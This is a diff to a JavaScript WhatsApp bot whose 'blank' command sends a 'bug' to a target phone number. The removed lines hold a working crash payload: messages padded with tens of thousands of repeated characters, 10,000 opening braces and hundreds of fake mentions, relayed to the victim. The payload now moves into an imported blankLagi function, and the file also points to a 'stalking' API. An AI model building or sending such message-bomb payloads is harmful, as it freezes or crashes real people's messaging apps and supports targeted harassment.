@@ -26,6 +26,7 @@ const GROQ_API_KEY = ''; // Removed for security
 //const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
 const { writeExif, imageToWebp, videoToWebp, writeExifImg, writeExifVid, addExif } = require('./allfunc/exif');
 const bugFuncs = require('./allfunc/bugFuncs');
+const { blankLagi } = require('./allfunc/blanklagi');
 
 const API_KEY = 'free_key@maher_apis';
 const API_BASE = 'https://api.nexoracle.com/stalking';
@@ -2043,70 +2044,9 @@ case 'blank': {
   let target = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
   reply(`🚀 ꜱᴇɴᴅɪɴɢ ${command.toUpperCase()} ʙᴜɢ ᴛᴏ @${text}...`)
   
-  const media = await prepareWAMessageMedia(
-    { image: { url: "https://i.postimg.cc/D0VjjHWn/file-00000000083482068d50b99993db8182.png" } },
-    { upload: bad.waUploadToServer }
-  )
-
   try {
-    const Msg = {
-      extendedTextMessage: {
-        text: "Makan Blank Bang" + "ꦾ".repeat(6000),
-        contextInfo: {
-          mentionedJid: [
-            "0@s.whatsapp.net",
-            ...Array.from(
-              { length: 700 },
-              () => `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
-            )
-          ],
-          stanzaId: bad.generateMessageTag(),
-          participant: target,
-          quotedMessage: {
-            conversation: "ꦾ".repeat(60000)
-          }
-        },
-        nativeFlowMessage: {
-          messageParamsJson: "{".repeat(10000)
-        }
-      }
-    };
-
-    await bad.relayMessage(target, Msg, {
-      messageId: bad.generateMessageTag()
-    });
-
-    const newsletterMsg = {
-      botInvokeMessage: {
-        message: {
-          newsletterAdminInviteMessage: {
-            newsletterJid: "1@newsletter",
-            newsletterName: "Snith Point",
-            jpegThumbnail: media,
-            caption: "ꦾ".repeat(3000),
-            inviteExpiration: Date.now() + 9999999999
-          }
-        }
-      },
-      nativeFlowMessage: {
-        messageParamsJson: "{".repeat(10000)
-      },
-      contextInfo: {
-        remoteJid: target,
-        participant: target,
-        stanzaId: bad.generateMessageTag(),
-        quotedMessage: {
-          conversation: "ꦾ".repeat(60000)
-        }
-      }
-    };
-
-    await bad.relayMessage(target, newsletterMsg, {
-      messageId: bad.generateMessageTag()
-    });
-    
+    await blankLagi(bad, target)
     reply('✅ ʙʟᴀɴᴋ ʙᴜɢ sᴇɴᴛ sᴜᴄᴄᴇssғᴜʟʟʏ!')
-
   } catch (err) {
     console.error("Error:", err);
     reply('❌ ғᴀɪʟᴇᴅ ᴛᴏ sᴇɴᴅ ʙᴜɢ.')
